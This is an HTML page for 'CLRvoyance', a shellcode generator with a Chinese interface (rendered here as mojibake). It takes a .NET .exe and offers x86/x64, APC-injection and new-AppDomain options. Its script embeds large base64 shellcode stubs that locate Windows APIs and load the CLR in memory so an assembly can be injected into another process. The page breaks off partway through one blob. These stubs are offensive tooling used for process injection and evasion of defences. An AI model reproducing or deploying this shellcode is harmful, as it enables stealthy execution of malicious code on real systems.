<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CLRvoyance - Shellcode ÁîüÊàêÂô®</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
            color: #e0e0e0;
            min-height: 100vh;
            padding: 20px;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
        }

        .main-content {
            display: grid;
            grid-template-columns: 1fr;
            gap: 20px;
            margin-bottom: 20px;
            max-width: 800px;
            margin-left: auto;
            margin-right: auto;
        }

        .panel {
            background: rgba(20, 20, 30, 0.8);
            border-radius: 12px;
            padding: 25px;
            border: 1px solid rgba(255, 255, 255, 0.1);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }

        .panel h2 {
            color: #00d4ff;
            margin-bottom: 20px;
            font-size: 1.5em;
            border-bottom: 2px solid rgba(0, 212, 255, 0.3);
            padding-bottom: 10px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        .form-group label {
            display: block;
            margin-bottom: 8px;
            color: #b0b0b0;
            font-weight: 500;
        }

        .form-group input[type="file"],
        .form-group select,
        .form-group input[type="text"] {
            width: 100%;
            padding: 12px;
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 8px;
            color: #e0e0e0;
            font-size: 14px;
            transition: all 0.3s;
        }

        .form-group input[type="file"]:focus,
        .form-group select:focus,
        .form-group input[type="text"]:focus {
            outline: none;
            border-color: #00d4ff;
            box-shadow: 0 0 10px rgba(0, 212, 255, 0.3);
        }

        .drop-zone {
            border: 2px dashed rgba(255, 255, 255, 0.3);
            border-radius: 12px;
            padding: 40px;
            text-align: center;
            cursor: pointer;
            transition: all 0.3s;
            background: rgba(0, 0, 0, 0.3);
            position: relative;
        }

        .drop-zone:hover {
            border-color: rgba(0, 212, 255, 0.5);
            background: rgba(0, 212, 255, 0.05);
        }

        .drop-zone.drag-over {
            border-color: #00d4ff;
            background: rgba(0, 212, 255, 0.1);
            box-shadow: 0 0 20px rgba(0, 212, 255, 0.3);
            transform: scale(1.02);
        }

        .drop-zone-content {
            pointer-events: none;
        }

        .drop-zone-content .file-info,
        .drop-zone-content .remove-file {
            pointer-events: auto;
        }

        .drop-icon {
            font-size: 48px;
            margin-bottom: 15px;
            opacity: 0.7;
        }

        .drop-text {
            color: #e0e0e0;
            font-size: 16px;
            margin-bottom: 8px;
        }

        .drop-link {
            color: #00d4ff;
            text-decoration: underline;
            cursor: pointer;
        }

        .drop-hint {
            color: #888;
            font-size: 13px;
        }

        .file-info {
            display: flex;
            align-items: center;
            justify-content: space-between;
            background: rgba(0, 212, 255, 0.1);
            padding: 12px 16px;
            border-radius: 8px;
            margin-top: 15px;
            border: 1px solid rgba(0, 212, 255, 0.3);
        }

        .file-name {
            color: #00d4ff;
            font-weight: 600;
            flex: 1;
            text-align: left;
        }

        .file-size {
            color: #a0a0a0;
            font-size: 13px;
            margin: 0 15px;
        }

        .remove-file {
            background: rgba(248, 113, 113, 0.2);
            border: 1px solid rgba(248, 113, 113, 0.5);
            color: #f87171;
            width: 28px;
            height: 28px;
            border-radius: 50%;
            cursor: pointer;
            font-size: 16px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s;
        }

        .remove-file:hover {
            background: rgba(248, 113, 113, 0.3);
            transform: scale(1.1);
        }

        .form-group textarea {
            width: 100%;
            padding: 12px;
            background: rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 8px;
            color: #e0e0e0;
            font-size: 12px;
            font-family: 'Courier New', monospace;
            resize: vertical;
            min-height: 80px;
            transition: all 0.3s;
        }

        .form-group textarea:focus {
            outline: none;
            border-color: #00d4ff;
            box-shadow: 0 0 10px rgba(0, 212, 255, 0.3);
        }

        .checkbox-group {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 15px;
        }

        .checkbox-group input[type="checkbox"] {
            width: 20px;
            height: 20px;
            cursor: pointer;
        }

        .checkbox-group label {
            color: #b0b0b0;
            cursor: pointer;
        }

        .btn {
            background: linear-gradient(135deg, #00d4ff 0%, #0099cc 100%);
            color: #000;
            border: none;
            padding: 15px 30px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            width: 100%;
            margin-top: 10px;
        }

        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(0, 212, 255, 0.4);
        }

        .btn:active {
            transform: translateY(0);
        }

        .btn:disabled {
            background: #444;
            cursor: not-allowed;
            opacity: 0.6;
        }


        @media (max-width: 1024px) {
            .main-content {
                grid-template-columns: 1fr;
            }
        }

        ::-webkit-scrollbar {
            width: 10px;
            height: 10px;
        }

        ::-webkit-scrollbar-track {
            background: rgba(0, 0, 0, 0.3);
            border-radius: 5px;
        }

        ::-webkit-scrollbar-thumb {
            background: rgba(0, 212, 255, 0.5);
            border-radius: 5px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: rgba(0, 212, 255, 0.7);
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="main-content">
            <div class="panel">
                <h2>‚öôÔ∏è ÁîüÊàêÈÖçÁΩÆ</h2>
                <div class="form-group">
                    <label>Á®ãÂ∫èÈõÜÊñá‰ª∂ (.NET Assembly)</label>
                    <div class="drop-zone" id="dropZone">
                        <div class="drop-zone-content">
                            <div class="drop-icon">üìÅ</div>
                            <p class="drop-text">ÊãñÊãΩÊñá‰ª∂Âà∞Ê≠§Â§ÑÊàñ <span class="drop-link">ÁÇπÂáªÈÄâÊã©</span></p>
                            <p class="drop-hint">ÊîØÊåÅ .exe Êñá‰ª∂</p>
                            <input type="file" id="assemblyFile" accept=".exe" style="display: none;">
                            <div class="file-info" id="fileInfo" style="display: none;">
                                <span class="file-name" id="fileName"></span>
                                <span class="file-size" id="fileSize"></span>
                                <button class="remove-file" onclick="removeFile()">‚úï</button>
                            </div>
                        </div>
                    </div>
                </div>

                <div class="form-group">
                    <label>Âπ≥Âè∞Êû∂ÊûÑ</label>
                    <select id="platform">
                        <option value="32">32 ‰Ωç (x86)</option>
                        <option value="64">64 ‰Ωç (x64)</option>
                    </select>
                </div>

                <div class="checkbox-group">
                    <input type="checkbox" id="useApc">
                    <label for="useApc">‰ΩøÁî®ÂÆâÂÖ® APC Shellcode</label>
                </div>

                <div class="checkbox-group">
                    <input type="checkbox" id="newDomain">
                    <label for="newDomain">Âä†ËΩΩÂà∞Êñ∞Âüü (New Domain)</label>
                </div>

                <div class="form-group">
                    <label>ËæìÂá∫Ê†ºÂºè</label>
                    <select id="outputFormat">
                        <option value="binary">‰∫åËøõÂà∂Êñá‰ª∂ (.bin)</option>
                        <option value="c">C ËØ≠Ë®ÄÊ†ºÂºè (.h)</option>
                        <option value="net">.NET Â≠óËäÇÊï∞ÁªÑÊ†ºÂºè (.cs)</option>
                    </select>
                </div>

                <button class="btn" id="generateBtn" onclick="generateShellcode()">üöÄ ÁîüÊàê Shellcode</button>
            </div>
        </div>
    </div>

    <script>
        // ============================================
        // Shellcode Base64 ÈÖçÁΩÆÂå∫Âüü
        // ============================================
        const SHELLCODE_BASE64 = {
            'sc-32-clr': '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',
            'sc-64-clr': 'SIHsiAAAAOloAQAAw0iB7GgBAABIiVwkKEiJbCQwSIl8JDhIiXQkQEyJZCRITIlsJFBMiXQkWEyJfCRgZUyLHCVgAAAATYtbGE2NWxBNid9Nixv8SYt7YEiJzqyEwHQmiieA/GF8A4DsIDjEdQhI/8dI/8fr5U2LG005+3XWSDHA6bsAAABJi1swRItjPEkB3EmBxIgAAABFiywkTYXtdQhIMcDpmAAAAE6NHCtFi3QkBE0B7kGLSxhFi1MgSQHa/8lNjSSKQYs8JEgB30iJ1qZ1EIoGhMB0Auv1igeEwHQL6+2FyXXZSDHA61VFi2MkSQHcZkGLDExFi2McSQHcQYsEjEw56Hw2TDnwczFIjTQYSI18JGikgD4udfqkxwdETEwATYnGSI1MJGhB/9FNifBIjUwkaEiJ8un+/v//SAHYSYkASItcJChIi2wkMEiLfCQ4SIt0JEBMi2QkSEyLbCRQTIt0JFhMi3wkYEiBxGgBAADDZUiLNCUwAAAASIPGKEmJ8EiNFeoGAABIjQ3JBgAA6Hb+//9IMcm6AAMAAEG4ABAAAEG5BAAAAP/QhcAPhBgGAABlSIs0JTAAAABIiUYoZUiLNCUoAAAASIPGGEmJ8EiNFY8GAABIjQ17BgAA6Cj+//9IjQ2iBgAAZUiLNCUoAAAA/1YYZUiLNCUoAAAASIPGIEmJ8EiNFYsGAABIjQ14BgAA6PL9//9IjQ2KBgAAZUiLNCUoAAAA/1YYZUiLNCUoAAAASIPGKEmJ8EiNFXQGAABIjQ1gBgAA6Lz9//9lSIs0JSgAAABIg8YwSYnwSI0VYQYAAEiNDT0GAADomf3//2VIizQlKAAAAEiDxjhJifBIjRVUBgAASI0NGgYAAOh2/f//ZUiLNCUoAAAASIPGQEmJ8EiNFUUGAABIjQ33BQAA6FP9//9lSIs0JSgAAABIg8ZISYnwSI0VXgYAAEiNDdQFAADoMP3//2VIizQlKAAAAEiBxlgBAABJifBIjRUSBgAASI0NrgUAAOgK/f//ZUiLNCUoAAAASIHGYAEAAEmJ8EiNFf8FAABIjQ2IBQAA6OT8//9lTIsEJSgAAABJg8BQSI0VqAQAAEiNDZEEAABlSIs0JSgAAAD/ViCFwA+FdQQAAGVIiwQlKAAAAEiDwFBIiwBIiwBlTIsMJSgAAABJg8FYTI0FdgQAAEiNFa8EAABlSIsMJSgAAABIg8FQSIsJ/1AYhcAPhSwEAABlSIsEJSgAAABIg8BYSIsASIsAZUyLDCUoAAAASYPBaEyNBT0EAABIjRVGBAAAZUiLDCUoAAAASIPBWEiLCf9QSIXAD4XjAwAAZUiLBCUoAAAASIPAaEiLAEiLAGVIiwwlKAAAAEiDwWhIiwn/UFBlSIsEJSgAAABIg8BoSIsASIsAZUiLFCUoAAAASIPCcGVIiwwlKAAAAEiDwWhIiwn/UGiFwA+FggMAAGVIiwQlKAAAAEiDwHBIiwBIiwBlTIsEJSgAAABJg8B4SI0VswMAAGVIiwwlKAAAAEiDwXBIiwn/EIXAD4VBAwAAZUiLNCUoAAAASIHGOAEAAMcGQUFBQcZGCABlTIsEJSgAAABJgcA4AQAAugEAAABmuREAZUiLNCUoAAAA/1YohcAPhPoCAABlSIs0JSgAAABIiYaIAAAAZUiLFCUoAAAASIHCgAAAAGVIiwwlKAAAAEiBwYgAAABIiwllSIs0JSgAAAD/VjiFwA+FswIAAGVIiwQlKAAAAEiJx0iBx4AAAABIiz9IjTUEBAAASMfBQUFBQfOkZUiLDCUoAAAASIHBiAAAAEiLCWVIizwlKAAAAP9XQIXAD4VmAgAAZUiLBCUoAAAASIPAeEiLAEiLAGVMiwQlKAAAAEmBwJAAAABlSIsUJSgAAABIgcKIAAAASIsSZUiLDCUoAAAASIPBeEiLCf+QaAEAAIXAD4USAgAAZUiLBCUoAAAASAWQAAAASIsASIsAZUiLFCUoAAAASIHCmAAAAGVIiwwlKAAAAEiBwZAAAABIiwn/kIAAAACFwA+FzAEAAGVIiwQlKAAAAEgFmAAAAEiLAEiLAGVIixQlKAAAAEiBwlABAABlSIsMJSgAAABIgcGYAAAASIsJ/5CQAAAAhcAPhYYBAABlTIsEJSgAAABJgcBwAQAAugEAAABlSIsMJSgAAABIgcFQAQAASIsJZUiLPCUoAAAA/5dYAQAAhcAPhUcBAABlTIsEJSgAAABJgcBoAQAAugEAAABlSIsMJSgAAABIgcFQAQAASIsJZUiLPCUoAAAA/5dgAQAAhcAPhQgBAABlSIsEJSgAAABIBWgBAABIiwBlSIscJSgAAABIgcNwAQAASIsbKdiDwAGD+AEPj9UAAABJicBIMdK5DAAAAGVIizQlKAAAAP9WMIXAD4S2AAAAZUiLFCUoAAAASImCGAEAAGVIiwwlKAAAAEiBwSgBAABlSIs8JSgAAAD/V0hlSIsEJSgAAABIBZgAAABIiwBIiwBNMcllTIsEJSgAAABJgcAYAQAATYsAZUiLFCUoAAAASIHCKAEAAGVIiwwlKAAAAEiBwZgAAABIiwn/kCgBAABlSIs0JSgAAABWSYnwSI0V1wAAAEiNDakAAADoVvj//1m6AAMAAEG4AEAAAP/QSIHEiAAAAMNIgcSIAAAAw40YgJKODmdIswx/qDiE6N6e2zLTs7klQYIHoUiE9TIW0tE5vS+6akiJsLSwy0ZokSJnL8s6q9IRnEAAwE+jCj4jZy/LOqvSEZxAAMBPowo+3Jb2BSkrYzati8Q4nPKnE3YANAAuADAALgAzADAAMwAxADkAAAAAAAAAAAAAAAAAAAAAAAAAS0VSTkVMMzIuRExMAExvYWRMaWJyYXJ5QQBWaXJ0dWFsQWxsb2MAVmlydHVhbEZyZWUATVNDT1JFRS5ETEwAQ0xSQ3JlYXRlSW5zdGFuY2UAT0xFQVVUMzIuRExMAFNhZmVBcnJheUNyZWF0ZQBTYWZlQXJyYXlDcmVhdGVWZWN0b3IAU2FmZUFycmF5QWNjZXNzRGF0YQBTYWZlQXJyYXlVbmFjY2Vzc0RhdGEAU2FmZUFycmF5R2V0TEJvdW5kAFNhZmVBcnJheUdldFVCb3VuZABWYXJpYW50SW5pdAAA', 
            'sc-32-clr-apc': '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',
            'sc-32-clrnd': '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',
            'sc-32-clrnd-apc': '6AAAAABbZKHAAAAAg/gAdQeJ54PHDIs/ZKEYAAAAg7ioAQAAAHUMjbPcBgAAibCoAQAAaBTzDABoiE4NAOhWAAAAid6Bxk0BAACD7gUxyVFRU1ZRUf/QaB5xAwBoCLcBAOgyAAAAagFX/9DDVYnlUVZXi00Mi3UQi30U/zb/dQjoEwAAAIkHg8cEg8YE4uxfXlmJ7F3CEABVieVTVldRZP81MAAAAFiLQAyLSAyLEYtBMGoCi30IV1DoWwAAAIXAdASJ0evni0EYUItYPAHYi1h4WFABw4tLHItTIItbJAHBAcIBw4syWFABxmoB/3UMVugjAAAAhcB0CIPCBIPDAuvjWDHSZosTweICAdEDAVlfXluJ7F3CCABVieVRU1IxyTHbMdKLRQiKEIDKYAHT0eMDRRCKCITJ4O4xwItNDDnLdAFAWltZiexdwgwAaEIxDgBoiE4NAOg8////agRoABAAAGgAAwAAagD/0IXAD4Q7BAAAZIs1GAAAAIlGFGiGVw0AaIhODQDoC////2SLNRQAAACDxjiJBo2zpwYAAFZkizUUAAAAg8Y4/xaNs5sGAABWZIs1FAAAAIPGOP8WaHJUawBoiIwNAOjK/v//ZIs1FAAAAIPGPIkGaBBT1RpoiIwNAOiv/v//ZIs1FAAAAIPGQIkGaHoutQZoiIwNAOiU/v//ZIs1FAAAAIPGRIkGaHo21hpoiIwNAOh5/v//ZIs1FAAAAIPGSIkGaFitWgNoiIwNAOhe/v//ZIs1FAAAAIHGgAAAAIkGaJivWgNoiIwNAOhA/v//ZIs1FAAAAIHGhAAAAIkGaBbJngFoaNQGAOgi/v//ZIs1FAAAAIPGTIkGZIs1FAAAAIPGUFaNs7sFAABWjbOrBQAAVmSLNRQAAACDxkz/FoXAD4UAAwAAZIs1FAAAAIPGVFaNs8sFAABWjbO0BgAAVmSLNRQAAACDxlCLFlKLCv9RDIXAD4XNAgAAZIs1FAAAAIPGWFaNs9sFAABWjbPrBQAAVmSLNRQAAACDxlSLFlKLCv9RJIXAD4WaAgAAZIs1FAAAAIPGWIsWUosK/1EohcAPhYACAABkizUUAAAAg8ZcVmoAjbPKBgAAVmSLNRQAAACDxliLFlKLCv9RMIXAD4VSAgAAZIs1FAAAAIPGYFaNs/sFAABWZIs1FAAAAIPGXIsWUosK/xGFwA+FJwIAAGSLNRQAAACDxnjHBkFBQUHHRgQAAAAAZIs1FAAAAIPGeFZqAWoRZIs1FAAAAIPGPP8WhcAPhO0BAABkizUUAAAAg8Z0iQZkizUUAAAAg8ZkVmSLNRQAAACLdnRWZIs1FAAAAIPGRP8WhcAPhbcBAABkizUUAAAAi3ZkifeNs/QGAAC5QUFBQfOkZIs1FAAAAIt2dFZkizUUAAAAg8ZI/xaFwA+FfwEAAGSLNRQAAACDxmhWZIs1FAAAAIt2dFZkizUUAAAAg8ZgixZSiwr/kbQAAACFwA+FTAEAAGSLNRQAAACDxmxWZIs1FAAAAIPGaIsWUosK/1FAhcAPhScBAABkizUUAAAAg8Z8VmSLNRQAAACDxmyLFlKLCv9RSIXAD4UCAQAAZIs1FAAAAIHGjAAAAFZqAWSLNRQAAACLdnxWZIs1FAAAAIHGgAAAAP8WhcAPhdAAAABkizUUAAAAgcaQAAAAVmoBZIs1FAAAAIt2fFZkizUUAAAAgcaEAAAA/xaFwA+FngAAAGSLNRQAAACLtpAAAACJ8GSLNRQAAACLtowAAACJ8ynYg8ABg/gBf3ZQagBqDGSLNRQAAACDxkD/FoXAdGFkizU